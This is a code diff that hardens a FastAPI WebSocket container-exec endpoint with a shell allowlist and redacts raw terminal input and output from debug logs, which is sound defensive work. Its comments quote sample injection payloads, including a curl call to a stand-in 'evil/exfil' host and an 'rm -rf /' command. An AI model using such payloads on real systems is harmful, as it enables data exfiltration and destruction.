@@ -27,6 +27,27 @@ def get_db():
     finally:
         db.close()
 
+
+# Only these shell paths can be invoked through the exec WebSocket. Anything
+# else is rejected before we open the docker exec stream. Previously the
+# `shell` query parameter was forwarded to shlex.split + aiodocker.exec
+# verbatim, which let a caller smuggle a full command line via something
+# like ?shell=/bin/sh+-c+'curl%20evil/exfil'.
+ALLOWED_EXEC_SHELLS = frozenset({
+    "/bin/sh",
+    "/bin/bash",
+    "/bin/ash",
+    "/bin/zsh",
+    "/usr/bin/sh",
+    "/usr/bin/bash",
+    "/usr/bin/ash",
+    "/usr/bin/zsh",
+    "sh",
+    "bash",
+    "ash",
+    "zsh",
+})
+
 @router.get("/stats")
 async def get_all_container_stats(
     Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
@@ -183,6 +204,15 @@ async def container_exec(
     """
     await websocket.accept()
 
+    # Validate the shell argument before doing anything else. The whitelist
+    # blocks ?shell=/bin/sh -c 'rm -rf /' style smuggling where shlex.split
+    # would happily turn the parameter into a multi-token command.
+    if shell.strip() not in ALLOWED_EXEC_SHELLS:
+        logger.warning("WebSocket exec rejected: disallowed shell %r", shell)
+        await websocket.send_json({"error": "Forbidden: shell not allowed"})
+        await websocket.close(code=1008)
+        return
+
     # Check Auth + AuthZ
     # The previous implementation only verified the JWT signature; any valid
     # token — including a short-lived setup_pending token — granted shell access
@@ -289,7 +319,12 @@ async def container_exec(
                     # msg is bytes?
                     # xterm expects string or bytes.
                     if msg.data:
-                         logger.debug(f"OUT: {msg.data}")
+                         # Deliberately NOT logging msg.data — raw terminal
+                         # output can include passwords typed at sudo prompts,
+                         # tokens emitted by tools, etc. Semgrep flagged this
+                         # (log-leak rule) and the flag was correct; only the
+                         # frame length is safe to record.
+                         logger.debug("OUT: %d bytes", len(msg.data))
                          await websocket.send_bytes(msg.data)
             except Exception as e:
                 logger.error(f"Read from docker error: {e}")
@@ -317,8 +352,10 @@ async def container_exec(
                             # the raw bytes to the container's stdin.
                             logger.debug(f"WS input not a control frame: {parse_err}")
 
-                        # Send to docker
-                        logger.debug(f"IN: {input_data.encode()}")
+                        # Send to docker. Same reasoning as the OUT path:
+                        # never log the raw user input — it's a live shell,
+                        # so the bytes include passwords / API tokens / etc.
+                        logger.debug("IN: %d bytes", len(input_data))
                         await stream.write_in(input_data.encode())
 
                     elif "bytes" in data:
